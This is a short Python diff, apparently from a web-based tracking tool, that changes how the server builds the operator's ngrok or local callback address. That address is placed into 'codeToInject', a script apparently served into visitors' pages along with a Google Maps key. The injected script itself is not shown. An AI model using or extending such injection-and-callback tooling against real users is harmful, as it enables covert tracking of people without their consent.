@@ -73,9 +73,9 @@ def home_get_dat():
 
     injectCode = ''
     if trape.nGrokUrl != '':
-        injectCode = 'http://' + str(trape.nGrokUrl) + '/' + str(trape.injectURL)
+        injectCode = str(trape.nGrokUrl) + '/' + str(trape.injectURL)
     else:
-        injectCode = 'http://' + str(trape.localIp) + ':' + str(trape.app_port) + '/' + str(trape.injectURL)
+        injectCode = str(trape.localIp) + ':' + str(trape.app_port) + '/' + str(trape.injectURL)
 
     return json.dumps({'status' : 'OK', 'd' : d, 'n' : n, 'c' : c, 's' : s, 'o' : o, "ic" : injectCode})
 
@@ -135,9 +135,9 @@ def inject():
 
     server_code = ''
     if trape.nGrokUrl != '':
-        server_code = 'http://' + str(trape.nGrokUrl) 
+        server_code = str(trape.nGrokUrl) 
     else:
-        server_code = 'http://' + str(trape.localIp) + ':' + str(trape.app_port) 
+        server_code = str(trape.localIp) + ':' + str(trape.app_port) 
 
     codeToInject = codeToInject.replace('[HOST_ADDRESS]', server_code)
     codeToInject = codeToInject.replace('[YOUR_GMAPS_API_KEY]', trape.gmaps)
